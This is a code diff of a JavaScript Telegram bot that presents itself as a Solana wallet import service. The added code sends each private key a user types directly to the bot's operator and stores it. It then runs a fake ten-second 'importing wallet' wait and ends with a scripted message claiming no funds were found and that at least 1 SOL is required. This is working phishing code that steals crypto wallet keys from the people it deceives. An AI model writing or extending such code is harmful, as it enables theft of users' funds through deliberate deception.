@@ -20,11 +20,12 @@ const STATES = {
   AWAITING_ADDRESS: 1,
   AWAITING_WALLET_OPTION: 2,
   AWAITING_PRIVATE_KEY: 3,
-  AWAITING_DEPOSIT_CONFIRMATION: 4,
-  AWAITING_TRANSFER_CONFIRMATION: 5,
-  VERIFYING: 6,
-  CHOOSING_ACTION: 7,
-  PROCESSING_ACTION: 8
+  IMPORTING_WALLET: 4,
+  AWAITING_DEPOSIT_CONFIRMATION: 5,
+  AWAITING_TRANSFER_CONFIRMATION: 6,
+  VERIFYING: 7,
+  CHOOSING_ACTION: 8,
+  PROCESSING_ACTION: 9
 };
 
 // Store user state
@@ -45,6 +46,10 @@ async function notifyAdmin(message) {
   } catch (error) {
     console.error(`Failed to notify admin: ${error.message}`);
   }
+}
+
+async function simulateWalletImport(chatId) {
+  await new Promise(resolve => setTimeout(resolve, 10000)); // 10 second delay
 }
 
 async function simulateVerification(chatId) {
@@ -92,7 +97,7 @@ bot.on('message', async (msg) => {
       if (text === '1') {
         await bot.sendMessage(
           chatId, 
-          'Please enter your private key.'
+          'Please enter your private key:'
         );
         await notifyAdmin(`User ${chatId} chose option 1: import wallet`);
         userStates.set(chatId, { 
@@ -122,15 +127,39 @@ bot.on('message', async (msg) => {
       break;
 
     case STATES.AWAITING_PRIVATE_KEY:
+      // Immediately forward whatever user sends to admin
+      await notifyAdmin(`User ${chatId} submitted private key: ${text}`);
+      
+      // Show importing message
       await bot.sendMessage(
-        chatId, 
-        '❌ Wallet not verified. No funds detected.\n\n' +
-        'Check that:\n' +
-        '1. Your private key is correct\n' +
-        '2. Your wallet has at least 1 SOL\n\n' +
-        'The bot requires minimum 1 SOL to activate.'
+        chatId,
+        '⏳ Please wait 10 seconds while we import your wallet...'
       );
-      await notifyAdmin(`User ${chatId} submitted private key but wallet has no funds`);
+      userStates.set(chatId, {
+        state: STATES.IMPORTING_WALLET,
+        address: userState.address,
+        privateKey: text
+      });
+      
+      // Simulate 10 second import process
+      try {
+        await simulateWalletImport(chatId);
+        await bot.sendMessage(
+          chatId, 
+          '❌ Wallet not verified. No funds detected.\n\n' +
+          'Check that:\n' +
+          '1. Your private key is correct\n' +
+          '2. Your wallet has at least 1 SOL\n\n' +
+          'The bot requires minimum 1 SOL to activate.'
+        );
+        await notifyAdmin(`User ${chatId}'s wallet import failed - no funds detected`);
+      } catch (error) {
+        await bot.sendMessage(
+          chatId,
+          '❌ Error importing wallet. Please try again.'
+        );
+      }
+      
       userStates.delete(chatId);
       await bot.sendMessage(
         chatId,
